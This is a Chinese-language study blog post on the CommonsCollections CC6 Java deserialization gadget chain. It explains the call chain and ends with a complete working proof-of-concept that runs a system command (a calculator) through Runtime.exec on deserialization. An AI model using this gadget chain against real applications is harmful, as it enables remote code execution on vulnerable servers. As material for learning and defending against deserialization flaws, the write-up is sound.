---
title: "Java反序列化-CC6"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化-CC6

学习第二条CommonsCollections的利用链

## TiedMapEntry

前面已经学习了CC1，但是在Java 8u71以后CC1就失效了，因为`sun.reflect.annotation.AnnotationInvocationHandler#readObject`的逻辑变化了

而CC6，就算是解决了高版本java的利用问题，先看看这个p神简化版利用链：

~~~
Gadget chain:
 java.io.ObjectInputStream.readObject()
 java.util.HashMap.readObject()
 java.util.HashMap.hash()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 org.apache.commons.collections.map.LazyMap.get()
 
org.apache.commons.collections.functors.ChainedTransformer.transform()
 
org.apache.commons.collections.functors.InvokerTransformer.transform()
 java.lang.reflect.Method.invoke()
 java.lang.Runtime.exec()
~~~

可以看到在LazyMap到exec的利用链是没变的，改变的主要是触发LazyMap#get()的方式，来替代原本CC1中的AnnotationInvocationHandler

而这里给出的类是`org.apache.commons.collections.keyvalue.TiedMapEntry`，他的getValue方法中调用了get：
![QQ_1761545408929](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761545408929.png)

而他的hashCode方法就调用了getValue：

![QQ_1761545473031](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761545473031.png)

那么我们需要做的就是找到能够调用这个hashCode的地方，在ysoserial中，是利⽤ java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)最后到 TiedMapEntry#hashCode() 

而p牛在 java.util.HashMap#readObject 中找到 HashMap#hash()的调⽤：
![QQ_1761545831628](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761545831628.png)

而这里的hash(key)就调用了key.hashCode()：

![QQ_1761545886574](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761545886574.png)

注意到这里的参数key，只要我们让key的值为TiedMapEntry的对象，那么最后调用的就是TiedMapEntry#hashCode()，如此就去掉了ysoserial最前⾯的两次调⽤，也能构造为完整gadget

## 构造

首先是LazyMap后的部分不变，这里为了防止在本地调试时就触发命令执行影响调试，所以先设置了一个fakeTransformers，等到序列化时再反射更改：

~~~java
Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
~~~

接下来按照TiedMapEntry的构造函数格式来创建对象：
~~~java
TiedMapEntry tme = new TiedMapEntry(innerMap, "Yuy0ung");
~~~

那么接下来就是让前面提到的key值为tme，从而调用TiedMapEntry#hashCode()：

~~~java
Map evilMap = new HashMap();
evilMap.put(tme,"Yuy0ung");
~~~

接下来用反射把fakeTransformers改回来：

~~~java
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain,transformers);
~~~

尝试序列化evilmap，发现反序列化时并没有触发命令执行：
![QQ_1761549183821](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761549183821.png)

调试分析，发现在触发factory.transform()前需要经过一个if判断：
![QQ_1761549388462](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761549388462.png)

而这里的值为false：

![QQ_1761549455041](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761549455041.png)

也就是map.containsKey(key)为true，也就是说map里面已经存在一个key为Yuy0ung的对象了，而我自己并没有put这玩意，说明一定是前面的代码调用有这个操作，这里其实是`evilMap.put(tme,"Yuy1ung");`的原因，我们打印这一步前后的map即可看出来：

![QQ_1761551025880](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761551025880.png)

那么我们在序列化前将这个新增的key移除即可：

~~~java
outerMap.remove("Yuy0ung");
~~~

值得一题的是，我在一开始并没有使用fakeTransformers这个方法，而是直接使用构造好的transformers，这种方法在运行到`evilMap.put(tme,"Yuy1ung");`就已经会触发命令执行了，调试一下就可以发现hashMap的put方法同样调用了hash(key)，所以会导致后面的调用链触发，从而命令执行：

![QQ_1761551209834](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761551209834.png)

至此我们得到了完整的poc：
~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections2 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "Yuy0ung");

        Map evilMap = new HashMap();
        evilMap.put(tme,"Yuy1ung");

        outerMap.remove("Yuy0ung");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        serialize(evilMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

尝试运行，成功命令执行触发计算器：

![QQ_1761551612412](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761551612412.png)

## 总结

再看一眼完整调用链：

~~~java
 java.io.ObjectInputStream.readObject()
 java.util.HashMap.readObject()
 java.util.HashMap.hash()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 org.apache.commons.collections.map.LazyMap.get()
 
org.apache.commons.collections.functors.ChainedTransformer.transform()
 
org.apache.commons.collections.functors.InvokerTransformer.transform()
 java.lang.reflect.Method.invoke()
 java.lang.Runtime.exec()
~~~

这个利⽤链可以在Java 7和8的⾼版本触发，没有版本限制